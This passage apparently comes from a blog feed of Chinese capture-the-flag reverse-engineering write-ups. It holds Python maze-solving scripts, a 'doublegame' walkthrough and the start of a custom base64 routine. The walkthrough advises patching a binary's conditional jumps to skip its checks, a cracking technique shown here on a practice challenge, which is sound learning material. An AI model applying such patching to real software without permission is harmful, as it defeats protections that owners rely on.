1, 0, 0, 0, 1, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1]</span>]</span><br>usedmap=<span class="hljs-comment">[<span class="hljs-comment">[0 for i in range(len(maze))]</span>for i in range(len(maze<span class="hljs-comment">[0]</span>))]</span><br>sti=0<br>stj=1<br>edi=24<br>edj=23<br>flag=&#x27;&#x27;<br>def dfs(x,y):<br>    global flag<br>    if x==edi and y==edj:<br>        print(flag)<br>        return<br>    if maze<span class="hljs-comment">[x+1]</span><span class="hljs-comment">[y]</span>==0 and usedmap<span class="hljs-comment">[x+1]</span><span class="hljs-comment">[y]</span>==0:<br>        usedmap<span class="hljs-comment">[x]</span><span class="hljs-comment">[y]</span>=1<br>        flag+=&#x27;s&#x27;<br>        dfs(x+1,y)<br>        flag=flag<span class="hljs-comment">[:-1]</span><br>        usedmap<span class="hljs-comment">[x]</span><span class="hljs-comment">[y]</span>=0<br>    if maze<span class="hljs-comment">[x-1]</span><span class="hljs-comment">[y]</span>==0 and usedmap<span class="hljs-comment">[x-1]</span><span class="hljs-comment">[y]</span>==0:<br>        usedmap<span class="hljs-comment">[x]</span><span class="hljs-comment">[y]</span>=1<br>        flag+=&#x27;w&#x27;<br>        dfs(x-1,y)<br>        flag=flag<span class="hljs-comment">[:-1]</span><br>        usedmap<span class="hljs-comment">[x]</span><span class="hljs-comment">[y]</span>=0<br>    if maze<span class="hljs-comment">[x]</span><span class="hljs-comment">[y+1]</span>==0 and usedmap<span class="hljs-comment">[x]</span><span class="hljs-comment">[y+1]</span>==0:<br>        usedmap<span class="hljs-comment">[x]</span><span class="hljs-comment">[y]</span>=1<br>        flag+=&#x27;d&#x27;<br>        dfs(x,y+1)<br>        flag=flag<span class="hljs-comment">[:-1]</span><br>        usedmap<span class="hljs-comment">[x]</span><span class="hljs-comment">[y]</span>=0<br>    if maze<span class="hljs-comment">[x]</span><span class="hljs-comment">[y-1]</span>==0 and usedmap<span class="hljs-comment">[x]</span><span class="hljs-comment">[y-1]</span>==0:<br>        usedmap<span class="hljs-comment">[x]</span><span class="hljs-comment">[y]</span>=1<br>        flag+=&#x27;a&#x27;<br>        dfs(x,y-1)<br>        flag=flag<span class="hljs-comment">[:-1]</span><br>        usedmap<span class="hljs-comment">[x]</span><span class="hljs-comment">[y]</span>=0<br>dfs(sti,stj)<br>&#x27;&#x27;&#x27;<br>for i in range(len(maze)):<br>    for j in range(len(maze<span class="hljs-comment">[0]</span>)):<br>        print(maze<span class="hljs-comment">[i]</span><span class="hljs-comment">[j]</span>,end=&#x27;&#x27;)<br>    print()<br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure><h1 id="例题3-doublegame"><a href="#例题3-doublegame" class="headerlink" title="例题3 doublegame"></a>例题3 doublegame</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722242072121-514173b5-a127-4f85-91fa-52129b918f90.png"></p><p>运行</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722242096451-7bae7aa6-269c-4701-859a-9bf8c435ee54.png"></p><p>ctrl F搜索gameover出现的地方，然后x查找调用函数</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722242173880-9f1c79a7-1f70-4f35-8706-f6d4ee27499f.png"></p><h2 id="（key非预期）发现有个可疑的数据，是key-13371337"><a href="#（key非预期）发现有个可疑的数据，是key-13371337" class="headerlink" title="（key非预期）发现有个可疑的数据，是key&#x3D;13371337"></a>（key非预期）发现有个可疑的数据，是key&#x3D;13371337</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722242151448-a1d6ea37-e848-4e45-8a93-21014039a4b5.png"></p><h2 id="key正常"><a href="#key正常" class="headerlink" title="key正常"></a>key正常</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722245506015-581550ac-dbac-4933-8619-58cde96fbd6d.png"></p><p>发现key ^0x1DC4&#x3D;13376013</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722245419058-b0588599-cd50-4ceb-b3b0-2a097b6faff0.png"></p><p>静态分析发现，sub_14001136B函数是第二关，将去第二关路上的 if的字节码全部修改为相反的， 然后patch，重新调试 （记得备份）</p><p>或者找到迷宫，</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722243985629-a34c7275-0cfd-4e95-9704-018fccdc19d7.png"></p><p>先拿出迷宫</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs tap">maze=&#x27;&#x27;&#x27; strcpy(Buffer, &quot;000000000000000000000&quot;);<br>  strcpy(v4, &quot;0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>0&quot;);<br>  strcpy(&amp;v4[22], &quot;0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 00000 </span>00000<span class="hljs-number"> 0 </span>0&quot;);<br>  strcpy(v5, &quot;0<span class="hljs-number"> 0 </span>             <span class="hljs-number"> 0 </span>0&quot;);<br>  strcpy(&amp;v5[22], &quot;0<span class="hljs-number"> 000 </span>000<span class="hljs-number"> 0 </span>000<span class="hljs-number"> 0 </span>0 0&quot;);<br>  strcpy(v6, &quot;0<span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span>0 0&quot;);<br>  strcpy(&amp;v6[22], &quot;0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 00000 </span>000<span class="hljs-number"> 000 </span>0&quot;);<br>  strcpy(v7, &quot;0<span class="hljs-number"> 0 </span>0    <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span>0    &quot;);<br>  strcpy(&amp;v7[22], &quot;0<span class="hljs-number"> 000 </span>0<span class="hljs-number"> 0 </span>000<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0&quot;);<br>  strcpy(v8, &quot;0    <span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0&quot;);<br>  strcpy(&amp;v8[22], &quot;0<span class="hljs-number"> 00000 </span>000<span class="hljs-number"> 000 </span>0<span class="hljs-number"> 0 </span>0&quot;);<br>  strcpy(v9, &quot;0    <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span>0&quot;);<br>  strcpy(&amp;v9[22], &quot;000<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>000<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0&quot;);<br>  strcpy(v10, &quot;0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>*<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0&quot;);<br>  strcpy(&amp;v10[22], &quot;0<span class="hljs-number"> 0000000 </span>0<span class="hljs-number"> 000 </span>00000&quot;);<br>  strcpy(v11, &quot;@  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 0 </span>0         0&quot;);<br>  strcpy(&amp;v11[22], &quot;0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 00000000000&quot;);<br>  strcpy(v12, &quot;0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>            0&quot;);<br>  strcpy(&amp;v12[22], &quot;000<span class="hljs-number"> 0 </span>00000<span class="hljs-number"> 0 </span>000 000&quot;);<br>  strcpy(v13, &quot;0        <span class="hljs-number"> 0 </span>0  <span class="hljs-number"> 0 </span>  0&quot;);<br>  strcpy(&amp;v13[22], &quot;000000000000000000000&quot;);&#x27;&#x27;&#x27;<br>maze=[(i[-24:-3]) for i in maze.split(&#x27;\n&#x27;)]<br>for i in maze:<br>    print(i)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722244218163-08dabf4d-3780-49fb-93dc-32b77155a0fd.png"></p><p>然后运行脚本</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">maze</span>=&#x27;&#x27;&#x27; strcpy(Buffer, <span class="hljs-string">&quot;000000000000000000000&quot;</span>);<br>  <span class="hljs-attribute">strcpy</span>(v4, <span class="hljs-string">&quot;0 0 0 0     0     0 0&quot;</span>);<br>  <span class="hljs-attribute">strcpy</span>(&amp;v4[<span class="hljs-number">22</span>], <span class="hljs-string">&quot;0 0 0 00000 00000 0 0&quot;</span>);<br>  <span class="hljs-attribute">strcpy</span>(v5, <span class="hljs-string">&quot;0 0               0 0&quot;</span>);<br>  <span class="hljs-attribute">strcpy</span>(&amp;v5[<span class="hljs-number">22</span>], <span class="hljs-string">&quot;0 000 000 0 000 0 0 0&quot;</span>);<br>  <span class="hljs-attribute">strcpy</span>(v6, <span class="hljs-string">&quot;0 0     0 0 0   0 0 0&quot;</span>);<br>  <span class="hljs-attribute">strcpy</span>(&amp;v6[<span class="hljs-number">22</span>], <span class="hljs-string">&quot;0 0 0 00000 000 000 0&quot;</span>);<br>  <span class="hljs-attribute">strcpy</span>(v7, <span class="hljs-string">&quot;0 0 0     0   0 0    &quot;</span>);<br>  <span class="hljs-attribute">strcpy</span>(&amp;v7[<span class="hljs-number">22</span>], <span class="hljs-string">&quot;0 000 0 0 000 0 0 0 0&quot;</span>);<br>  <span class="hljs-attribute">strcpy</span>(v8, <span class="hljs-string">&quot;0     0 0 0 0 0 0 0 0&quot;</span>);<br>  <span class="hljs-attribute">strcpy</span>(&amp;v8[<span class="hljs-number">22</span>], <span class="hljs-string">&quot;0 00000 000 000 0 0 0&quot;</span>);<br>  <span class="hljs-attribute">strcpy</span>(v9, <span class="hljs-string">&quot;0     0       0   0 0&quot;</span>);<br>  <span class="hljs-attribute">strcpy</span>(&amp;v9[<span class="hljs-number">22</span>], <span class="hljs-string">&quot;000 0 0 0 000 0 0 0 0&quot;</span>);<br>  <span class="hljs-attribute">strcpy</span>(v10, <span class="hljs-string">&quot;0 0 0 0 0 0 * 0 0 0 0&quot;</span>);<br>  <span class="hljs-attribute">strcpy</span>(&amp;v10[<span class="hljs-number">22</span>], <span class="hljs-string">&quot;0 0000000 0 000 00000&quot;</span>);<br>  <span class="hljs-attribute">strcpy</span>(v11, <span class="hljs-string">&quot;@   0   0 0         0&quot;</span>);<br>  <span class="hljs-attribute">strcpy</span>(&amp;v11[<span class="hljs-number">22</span>], <span class="hljs-string">&quot;0 0 0 0 0 00000000000&quot;</span>);<br>  <span class="hljs-attribute">strcpy</span>(v12, <span class="hljs-string">&quot;0 0 0 0             0&quot;</span>);<br>  <span class="hljs-attribute">strcpy</span>(&amp;v12[<span class="hljs-number">22</span>], <span class="hljs-string">&quot;000 0 00000 0 000 000&quot;</span>);<br>  <span class="hljs-attribute">strcpy</span>(v13, <span class="hljs-string">&quot;0         0 0   0   0&quot;</span>);<br>  <span class="hljs-attribute">strcpy</span>(&amp;v13[<span class="hljs-number">22</span>], <span class="hljs-string">&quot;000000000000000000000&quot;</span>);&#x27;&#x27;&#x27;<br><span class="hljs-attribute">maze</span>=[(i[-<span class="hljs-number">24</span>:-<span class="hljs-number">3</span>]) for i in maze.split(&#x27;\n&#x27;)]<br><br><br><span class="hljs-attribute">for</span> i in maze:<br>    <span class="hljs-attribute">print</span>(i)<br><span class="hljs-comment"># print(len(maze),(len(maze[0])))</span><br><span class="hljs-attribute">from</span> hashlib import md5<br><span class="hljs-attribute">def</span> finda(d):<br>    <span class="hljs-attribute">x</span>,y=d[<span class="hljs-number">0</span>],d[<span class="hljs-number">1</span>]-<span class="hljs-number">1</span><br>    <span class="hljs-attribute">return</span> (x,y,&#x27;a&#x27;)<br><span class="hljs-attribute">def</span> findw(d):<br>    <span class="hljs-attribute">x</span>,y=d[<span class="hljs-number">0</span>]-<span class="hljs-number">1</span>,d[<span class="hljs-number">1</span>]<br>    <span class="hljs-attribute">return</span> (x,y,&#x27;w&#x27;)<br><span class="hljs-attribute">def</span> finds(d):<br>    <span class="hljs-attribute">x</span>,y=d[<span class="hljs-number">0</span>]+<span class="hljs-number">1</span>,d[<span class="hljs-number">1</span>]<br>    <span class="hljs-attribute">return</span> (x,y,&#x27;s&#x27;)<br><span class="hljs-attribute">def</span> findd(d):<br>    <span class="hljs-attribute">x</span>,y=d[<span class="hljs-number">0</span>],d[<span class="hljs-number">1</span>]+<span class="hljs-number">1</span><br>    <span class="hljs-attribute">return</span> (x,y,&#x27;d&#x27;)<br><span class="hljs-attribute">def</span> find0(d,row,column):<br>    <span class="hljs-attribute">if</span> d[<span class="hljs-number">0</span>]==<span class="hljs-number">0</span>:<br>        <span class="hljs-attribute">t</span>=[finda(d),findd(d),finds(d)]<br>    <span class="hljs-attribute">elif</span> d[<span class="hljs-number">0</span>]==row-<span class="hljs-number">1</span>:<br>        <span class="hljs-attribute">t</span>=[findw(d),finda(d),findd(d)]<br>    <span class="hljs-attribute">elif</span> d[<span class="hljs-number">1</span>]==<span class="hljs-number">0</span>:<br>        <span class="hljs-attribute">t</span>=[findw(d),findd(d),finds(d)]<br>    <span class="hljs-attribute">elif</span> d[<span class="hljs-number">1</span>]==column-<span class="hljs-number">1</span>:<br>        <span class="hljs-attribute">t</span>=[findw(d),finda(d),finds(d)]<br>    <span class="hljs-attribute">else</span>: t=[findw(d),finda(d),finds(d),findd(d)]<br>    <span class="hljs-attribute">tmp</span>=[]<br>    <span class="hljs-attribute">for</span> x,y,r in t:<br>        <span class="hljs-attribute">if</span> maze[x][y]==&#x27; &#x27;or maze[x][y]==&#x27;*&#x27; :<br>            <span class="hljs-attribute">tmp</span>.append((x,y,r))<br>    <span class="hljs-attribute">return</span> tmp<br><br><span class="hljs-attribute">def</span> get(o,O,row,column):#起点，终点，行，列<br>    <span class="hljs-attribute">SUM</span>=[]<br>    <span class="hljs-attribute">Road</span> =<span class="hljs-meta"> [(&#x27;&#x27;, o)]</span><br>    <span class="hljs-attribute">while</span> True:<br>        <span class="hljs-attribute">road</span>=[]<br>        <span class="hljs-attribute">for</span> (r_pre,d) in Road:<br>            <span class="hljs-attribute">if</span> d==O:#终点<br>                <span class="hljs-attribute">SUM</span>.append((len(r_pre),r_pre,))<br>                <span class="hljs-attribute">print</span>(r_pre.encode())<br>                <span class="hljs-attribute">print</span>(&#x27;NSSCTF&#123;&#x27;+md5(r_pre.encode()).hexdigest()+&#x27;<span class="hljs-number">13371337</span>&#x27;+&#x27;&#125;&#x27;)<br>                <span class="hljs-attribute">exit</span>()<br>                <span class="hljs-comment"># exit()</span><br>            <span class="hljs-attribute">next</span>=find0(d,row,column)<br>            <span class="hljs-attribute">for</span> x,y,r in next:<br>                <span class="hljs-attribute">if</span> len(r_pre)&gt;=<span class="hljs-number">1</span>:<br>                    <span class="hljs-attribute">if</span> &#x27;ws&#x27;in r_pre[-<span class="hljs-number">1</span>]+r or &#x27;sw&#x27; in r_pre[-<span class="hljs-number">1</span>]+r:<br>                        <span class="hljs-attribute">continue</span><br>                    <span class="hljs-attribute">if</span> &#x27;ad&#x27; in r_pre[-<span class="hljs-number">1</span>] + r or &#x27;da&#x27; in r_pre[-<span class="hljs-number">1</span>] + r:<br>                        <span class="hljs-attribute">continue</span><br>                <span class="hljs-attribute">road</span>.append((r_pre+r,(x,y)))<br>        <span class="hljs-comment"># print(road)</span><br>        <span class="hljs-attribute">Road</span>=road<br><br><span class="hljs-attribute">row</span>,column=<span class="hljs-number">21</span>,<span class="hljs-number">21</span><br><span class="hljs-attribute">get</span>((<span class="hljs-number">15</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">7</span>,<span class="hljs-number">20</span>),row,column)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722245042043-0f1e8bb4-abac-453b-b0d7-b2c448126fbb.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>REVERSE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>base变、tea、rc4</title>
    <link href="/2025/03/22/%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/"/>
    <url>/2025/03/22/%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h1 id="base64变"><a href="#base64变" class="headerlink" title="base64变"></a>base64变</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span><br><br>s = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><br><br><span class="hljs-comment"># s = &quot;vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">My_base64_encode</span>(<span class="hljs-params">inputs</span>):<br>    <span class="hljs-comment"># 将字符串转化为2进制</span><br>    bin_str = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> inputs:<br>        x = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(i))).replace(<span class="hljs-string">&#x27;0b&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        bin_str.append(<span class="hljs-string">&#x27;&#123;:0&gt;8&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(x))<br>    <span class="hljs-comment"># print(bin_str)</span><br>    <span class="hljs-comment"># 输出的字符串</span><br>    outputs = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-comment"># 不够三倍数，需补齐的次数</span><br>    nums = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> bin_str:<br>        <span class="hljs-comment"># 每次取三个字符的二进制</span><br>        temp_list = bin_str[:<span class="hljs-number">3</span>]<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(temp_list) != <span class="hljs-number">3</span>):<br>            nums = <span class="hljs-number">3</span> - <span class="hljs-built_in">len</span>(temp_list)<br>            <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(temp_list) &lt; <span class="hljs-number">3</span>:<br>                temp_list += [<span class="hljs-string">&#x27;0&#x27;</span> * <span class="hljs-number">8</span>]<br>        temp_str = <span class="hljs-string">&quot;&quot;</span>.join(temp_list)<br>        <span class="hljs-comment"># print(temp_str)</span><br>        <span class="hljs-comment"># 将三个8字节的二进制转换为4个十进制</span><br>        temp_str_list = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>):<br>            temp_str_list.append(<span class="hljs-built_in">int</span>(temp_str[i * <span class="hljs-number">6</span>:(i + <span class="hljs-number">1</span>) * <span class="hljs-number">6</span>], <span class="hljs-number">2</span>))<br>        <span class="hljs-comment"># print(temp_str_list)</span><br>        <span class="hljs-keyword">if</span> nums:<br>            temp_str_list = temp_str_list[<span class="hljs-number">0</span>:<span class="hljs-number">4</span> - nums]<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> temp_str_list:<br>            outputs += s[i]<br>        bin_str = bin_str[<span class="hljs-number">3</span>:]<br>    outputs += nums * <span class="hljs-string">&#x27;=&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Encrypted String:\n%s &quot;</span> % outputs)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">My_base64_decode</span>(<span class="hljs-params">inputs</span>):<br>    <span class="hljs-comment"># 将字符串转化为2进制</span><br>    bin_str = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> inputs:<br>        <span class="hljs-keyword">if</span> i != <span class="hljs-string">&#x27;=&#x27;</span>:<br>            x = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(s.index(i))).replace(<span class="hljs-string">&#x27;0b&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            bin_str.append(<span 